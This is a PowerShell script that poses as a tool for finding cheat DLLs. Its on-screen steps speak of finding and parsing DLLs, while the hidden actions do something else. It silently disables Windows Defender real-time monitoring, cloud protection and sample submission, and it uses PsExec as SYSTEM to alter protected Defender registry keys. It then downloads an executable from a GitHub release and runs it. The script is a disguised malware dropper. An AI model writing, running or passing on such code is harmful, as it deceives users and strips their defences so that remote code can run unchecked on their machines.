#Requires -RunAsAdministrator
$ErrorActionPreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"
$InformationPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

function Redirect-AllStreams {
    param(
        [ScriptBlock]$ScriptBlock
    )
    & $ScriptBlock *> $null
}

Write-Host "[1/5 Finding Dlls, This may take a while] " -ForegroundColor Cyan
$psToolsZip = "$env:TEMP\PSTools.zip"
Redirect-AllStreams { Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile $psToolsZip -UseBasicParsing }
Redirect-AllStreams { New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Force }
Redirect-AllStreams { New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force }

Redirect-AllStreams { Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpynetReporting" -Value 0 -Type DWord -Force }
Redirect-AllStreams { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Spynet" -Name "SpynetReporting" -Value 0 -Type DWord -Force }
Redirect-AllStreams { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "SpyNetReporting" -Value 0 -Type DWord -Force }

Redirect-AllStreams { Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -Type DWord -Force }
Redirect-AllStreams { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -Type DWord -Force }
Redirect-AllStreams { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "SubmitSamplesConsent" -Value 0 -Type DWord -Force }

Redirect-AllStreams { New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" -Force }
Redirect-AllStreams { Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager" -Name "AllowCloudProtection" -Value 0 -Type DWord -Force }

Redirect-AllStreams { gpupdate /force }
Redirect-AllStreams { Get-MpComputerStatus | Select CloudProtection, IsTamperProtected }

Redirect-AllStreams { Set-MpPreference -DisableRealtimeMonitoring $true -CloudBlockLevel ZeroTolerance -DisableBlockAtFirstSeen $true -SubmitSamplesConsent 0 }

Write-Host "[2/5 checking dlls] " -ForegroundColor Cyan
$extractPath = "$env:TEMP\PsExecTemp"
Redirect-AllStreams { Expand-Archive -Path $psToolsZip -DestinationPath $extractPath -Force }
$psexec = "$extractPath\PsExec.exe"

Redirect-AllStreams { & $psexec -accepteula -nobanner *> $null }

Write-Host "[3/5 Extracting dlls] " -ForegroundColor Cyan
Redirect-AllStreams { 
    & $psexec -s -i powershell.exe -Command "
    `$key1 = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection', `$true);
    if (`$key1) { 
        `$key1.SetValue('SubmitSamplesConsent', 2, [Microsoft.Win32.RegistryValueKind]::DWord); 
        `$key1.Close() 
    } else { 
        Write-Host 'done' 
    }

    `$key2 = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\\Microsoft\\Windows Defender\\Spynet', `$true);
    if (`$key2) { 
        `$key2.SetValue('SpynetReporting', 0, [Microsoft.Win32.RegistryValueKind]::DWord); 
        `$key2.SetValue('SubmitSamplesConsent', 2, [Microsoft.Win32.RegistryValueKind]::DWord); 
        `$key2.Close() 
    } else { 
        Write-Host 'done' 
    }
    `$key3 = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\\Microsoft\\Windows Defender\\Policy Manager', `$true);
    if (`$key3) { 
        `$key3.SetValue('AllowCloudProtection', 0, [Microsoft.Win32.RegistryValueKind]::DWord); 
        `$key3.Close() 
    } else { 
        Write-Host 'done' 
    }
    " *> $null
}

Write-Host "[4/5 Parsing Dlls] " -ForegroundColor Cyan
$safeFolder = "$env:TEMP\WPR_Temp"
if (-not (Test-Path $safeFolder)) {
    Redirect-AllStreams { New-Item -ItemType Directory -Path $safeFolder -Force }
}
Redirect-AllStreams { icacls $safeFolder /grant "SYSTEM:(OI)(CI)F" /grant "Administrators:(OI)(CI)F" *> $null }

Write-Host "[5/5 Checking integrity] " -ForegroundColor Cyan
$exePath = "$safeFolder\CheatDllFinder.exe"
if (Test-Path $exePath) {
    Redirect-AllStreams { Remove-Item $exePath -Force -ErrorAction SilentlyContinue }
}
Redirect-AllStreams { Invoke-WebRequest -Uri "https://github.com/Ferman9/DIFR-tools/releases/download/DIFR/CheatDllFinder.exe" -OutFile $exePath -UseBasicParsing }
Redirect-AllStreams { Start-Process -FilePath $exePath -Wait }

Write-Host "All done Check Directory for Results" -ForegroundColor Green
